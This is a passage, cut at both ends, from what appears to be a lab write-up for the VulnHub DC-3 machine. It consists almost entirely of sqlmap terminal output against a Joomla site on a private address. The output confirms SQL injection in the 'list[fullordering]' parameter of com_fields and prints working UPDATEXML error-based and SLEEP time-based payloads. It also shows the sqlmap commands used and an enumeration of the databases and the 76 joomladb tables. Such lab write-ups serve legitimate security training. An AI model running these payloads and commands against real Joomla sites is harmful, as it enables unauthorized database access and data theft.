WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#x27;</span>                                                                         <br>[15:08:42] [INFO] testing <span class="hljs-string">&#x27;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#x27;</span>                                                                          <br>[15:08:44] [INFO] testing <span class="hljs-string">&#x27;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#x27;</span>                                                                              <br>[15:08:46] [INFO] testing <span class="hljs-string">&#x27;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)&#x27;</span>                                                                               <br>[15:08:48] [INFO] testing <span class="hljs-string">&#x27;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#x27;</span>                                                                         <br>[15:08:50] [INFO] testing <span class="hljs-string">&#x27;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)&#x27;</span>                                                                          <br>[15:08:51] [INFO] testing <span class="hljs-string">&#x27;MySQL boolean-based blind - Parameter replace (MAKE_SET)&#x27;</span><br>[15:08:51] [INFO] testing <span class="hljs-string">&#x27;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#x27;</span>                                                                                     <br>[15:08:51] [INFO] testing <span class="hljs-string">&#x27;MySQL boolean-based blind - Parameter replace (ELT)&#x27;</span><br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL boolean-based blind - Parameter replace (ELT - original value)&#x27;</span>                                                                                          <br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL boolean-based blind - Parameter replace (bool*int)&#x27;</span><br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#x27;</span>                                                                                     <br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#x27;</span><br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#x27;</span>                                                                                 <br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#x27;</span><br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#x27;</span>                                                                                  <br>[15:08:52] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 boolean-based blind - Stacked queries&#x27;</span><br>[15:08:53] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0 boolean-based blind - Stacked queries&#x27;</span><br>[15:08:53] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span>                                                                   <br>[15:08:55] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span>                                                                                        <br>[15:08:56] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span>                                                                               <br>[15:08:57] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span><br>[15:08:59] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span>                                                                       <br>[15:09:00] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#x27;</span><br>[15:09:01] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#x27;</span>                                                                       <br>[15:09:03] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#x27;</span><br>[15:09:04] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span>                                                                             <br>[15:09:06] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span>                                                                              <br>[15:09:07] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span>                                                                      <br>[15:09:09] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span>                                                                       <br>[15:09:10] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span>                                                                         <br>[15:09:12] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)&#x27;</span>                                                                          <br>[15:09:13] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#x27;</span>                                                                             <br>[15:09:14] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)&#x27;</span><br>[15:09:16] [INFO] testing <span class="hljs-string">&#x27;MySQL OR error-based - WHERE or HAVING clause (FLOOR)&#x27;</span><br>[15:09:16] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;</span><br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&#x27;</span><br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.5 error-based - Parameter replace (EXP)&#x27;</span><br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)&#x27;</span><br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)&#x27;</span><br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#x27;</span><br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#x27;</span><br>[15:09:17] [INFO] GET parameter <span class="hljs-string">&#x27;list[fullordering]&#x27;</span> is <span class="hljs-string">&#x27;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#x27;</span> injectable                                                             <br>[15:09:17] [INFO] testing <span class="hljs-string">&#x27;MySQL inline queries&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt; 5.0.12 AND time-based blind (heavy query)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt; 5.0.12 OR time-based blind (heavy query)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 AND time-based blind (BENCHMARK - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt; 5.0.12 AND time-based blind (heavy query - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &lt; 5.0.12 OR time-based blind (BENCHMARK - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt; 5.0.12 OR time-based blind (heavy query - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL AND time-based blind (ELT)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL OR time-based blind (ELT)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL AND time-based blind (ELT - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL OR time-based blind (ELT - comment)&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;</span>                                                                                <br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)&#x27;</span>                                                                      <br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 time-based blind - Parameter replace&#x27;</span><br>[15:09:18] [INFO] testing <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#x27;</span>                                                                                           <br>[15:09:29] [INFO] GET parameter <span class="hljs-string">&#x27;list[fullordering]&#x27;</span> appears to be <span class="hljs-string">&#x27;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#x27;</span> injectable                                       <br>[15:09:29] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[15:09:29] [INFO] automatically extending ranges <span class="hljs-keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found<br>[15:09:29] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (random number) - 1 to 20 columns&#x27;</span><br>[15:09:30] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 21 to 40 columns&#x27;</span><br>[15:09:30] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (random number) - 21 to 40 columns&#x27;</span><br>[15:09:31] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 41 to 60 columns&#x27;</span><br>[15:09:31] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (random number) - 41 to 60 columns&#x27;</span><br>[15:09:32] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 61 to 80 columns&#x27;</span><br>[15:09:32] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (random number) - 61 to 80 columns&#x27;</span><br>[15:09:33] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (NULL) - 81 to 100 columns&#x27;</span><br>[15:09:33] [INFO] testing <span class="hljs-string">&#x27;Generic UNION query (random number) - 81 to 100 columns&#x27;</span><br>[15:09:34] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 1 to 20 columns&#x27;</span><br>[15:09:34] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 1 to 20 columns&#x27;</span><br>[15:09:35] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 21 to 40 columns&#x27;</span><br>[15:09:35] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 21 to 40 columns&#x27;</span><br>[15:09:36] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 41 to 60 columns&#x27;</span><br>[15:09:36] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 41 to 60 columns&#x27;</span><br>[15:09:37] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 61 to 80 columns&#x27;</span><br>[15:09:38] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 61 to 80 columns&#x27;</span><br>[15:09:38] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (NULL) - 81 to 100 columns&#x27;</span><br>[15:09:39] [INFO] testing <span class="hljs-string">&#x27;MySQL UNION query (random number) - 81 to 100 columns&#x27;</span><br>GET parameter <span class="hljs-string">&#x27;list[fullordering]&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] <br>sqlmap identified the following injection point(s) with a total of 2716 HTTP(s) requests:<br>---<br>Parameter: list[fullordering] (GET)<br>    Type: error-based<br>    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8824,CONCAT(0x2e,0x717a627071,(SELECT (ELT(8824=8824,1))),0x716a7a6b71),6230))<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8632 FROM (SELECT(SLEEP(5)))WmsI)<br>---<br>[15:09:51] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)<br>web application technology: Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.1<br>[15:09:51] [INFO] fetching database names<br>[15:09:51] [INFO] retrieved: <span class="hljs-string">&#x27;information_schema&#x27;</span><br>[15:09:51] [INFO] retrieved: <span class="hljs-string">&#x27;joomladb&#x27;</span><br>[15:09:51] [INFO] retrieved: <span class="hljs-string">&#x27;mysql&#x27;</span><br>[15:09:51] [INFO] retrieved: <span class="hljs-string">&#x27;performance_schema&#x27;</span><br>[15:09:51] [INFO] retrieved: <span class="hljs-string">&#x27;sys&#x27;</span><br>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys<br><br>[15:09:51] [WARNING] HTTP error codes detected during run:<br>500 (Internal Server Error) - 2675 <span class="hljs-built_in">times</span><br>[15:09:51] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span>                                                                               <br><br>[*] ending @ 15:09:51 /2023-05-31/<br><br>                                                                                             <br>┌──(kali㉿kali)-[~/vulnhub/DC/3/workSpace]<br>└─$ sudo sqlmap -u <span class="hljs-string">&quot;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --random-agent -D joomladb --tables<br>        ___<br>       __H__                                                                                 <br> ___ ___[(]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;                                                     </span><br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |                                                                    </span><br><span class="hljs-string">|___|_  [,]_|_|_|__,|  _|                                                                    </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                 </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 15:10:42 /2023-05-31/<br><br>[15:10:42] [INFO] fetched random HTTP User-Agent header value <span class="hljs-string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19&#x27;</span> from file <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span><br>[15:10:42] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[15:10:42] [INFO] testing connection to the target URL<br>[15:10:42] [WARNING] the web server responded with an HTTP error code (500) <span class="hljs-built_in">which</span> could interfere with the results of the tests<br>you have not declared cookie(s), <span class="hljs-keyword">while</span> server wants to <span class="hljs-built_in">set</span> its own (<span class="hljs-string">&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=gdur4j5rk68...ce25ghi8c2&#x27;</span>). Do you want to use those [Y/n] <br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: list[fullordering] (GET)<br>    Type: error-based<br>    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8824,CONCAT(0x2e,0x717a627071,(SELECT (ELT(8824=8824,1))),0x716a7a6b71),6230))<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8632 FROM (SELECT(SLEEP(5)))WmsI)<br>---<br>[15:10:44] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)<br>web application technology: Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.1<br>[15:10:44] [INFO] fetching tables <span class="hljs-keyword">for</span> database: <span class="hljs-string">&#x27;joomladb&#x27;</span><br>[15:10:44] [INFO] retrieved: <span class="hljs-string">&#x27;#__assets&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__associations&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__banner_clients&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__banner_tracks&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__banners&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_admin&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_books&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_comments&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_locations&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_mediafiles&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_message_typ&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_podcast&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_series&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_servers&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_studies&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_studytopics&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_teachers&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_templatecod&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_templates&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_timeset&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_topics&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__bsms_update&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__categories&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__contact_details&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__content&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__content_frontpag&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__content_rating&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__content_types&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__contentitem_tag_&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__core_log_searche&#x27;</span><br>[15:10:45] [INFO] retrieved: <span class="hljs-string">&#x27;#__extensions&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__fields&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__fields_categorie&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__fields_groups&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__fields_values&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_filters&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_links_ter&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_taxonomy&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_taxonomy_&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_terms&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_terms_com&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_tokens&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_tokens_ag&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__finder_types&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__jbsbackup_timese&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__jbspodcast_times&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__languages&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__menu&#x27;</span><br>[15:10:46] [INFO] retrieved: <span class="hljs-string">&#x27;#__menu_types&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__messages&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__messages_cfg&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__modules&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__modules_menu&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__newsfeeds&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__overrider&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__postinstall_mess&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__redirect_links&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__schemas&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__session&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__tags&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__template_styles&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__ucm_base&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__ucm_content&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__ucm_history&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__update_sites&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__update_sites_ext&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__updates&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__user_keys&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__user_notes&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__user_profiles&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__user_usergroup_m&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__usergroups&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__users&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__utf8_conversion&#x27;</span><br>[15:10:47] [INFO] retrieved: <span class="hljs-string">&#x27;#__viewlevels&#x27;</span><br>Database: joomladb<br>[76 tables]<br>+---------------------+<br>| <span class="hljs-comment">#__assets           |</span><br>| <span class="hljs-comment">#__associations     |</span><br>| <span class="hljs-comment">#__banner_clients   |</span><br>| <span class="hljs-comment">#__banner_tracks    |</span><br>| <span class="hljs-comment">#__banners          |</span><br>| <span class="hljs-comment">#__bsms_admin       |</span><br>| <span class="hljs-comment">#__bsms_books       |</span><br>| <span class="hljs-comment">#__bsms_comments    |</span><br>| <span class="hljs-comment">#__bsms_locations   |</span><br>| <span class="hljs-comment">#__bsms_mediafiles  |</span><br>| <span class="hljs-comment">#__bsms_message_typ |</span><br>| <span class="hljs-comment">#__bsms_podcast     |</span><br>| <span class="hljs-comment">#__bsms_series      |</span><br>| <span class="hljs-comment">#__bsms_servers     |</span><br>| <span class="hljs-comment">#__bsms_studies     |</span><br>| <span class="hljs-comment">#__bsms_studytopics |</span><br>| <span class="hljs-comment">#__bsms_teachers    |</span><br>| <span class="hljs-comment">#__bsms_templatecod |</span><br>| <span class="hljs-comment">#__bsms_templates   |</span><br>| <span class="hljs-comment">#__bsms_timeset     |</span><br>| <span class="hljs-comment">#__bsms_topics      |</span><br>| <span class="hljs-comment">#__bsms_update      |</span><br>| <span 